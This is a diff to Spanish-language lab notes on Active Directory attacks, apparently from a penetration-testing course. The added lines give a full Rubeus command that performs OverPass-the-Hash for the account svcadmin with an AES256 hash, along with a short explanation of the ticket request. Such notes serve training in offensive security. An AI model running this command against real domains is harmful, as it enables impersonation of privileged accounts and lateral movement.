@@ -480,5 +480,11 @@ Para poder usar las credneciales de *svcadmin* deberemos de realizas
 ### OverPass-the-Hash
 Deberemos de ejejecutar los siguiente comando desde una terminal con privilegios de *Local Admin* para asi poder ejecutar *Rubeus*.
 ```shell
+[student97]
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
+```
+
+```ad-important
+El comando anterior esta solicitando un *ticket Granting Ticket(TGT)* a traves del loader para una cuenta en este caso *svcadmin* usando el hash anterirormente descubierto.
+Tambien se creara un nuevo proceso *cmd.*
 ```
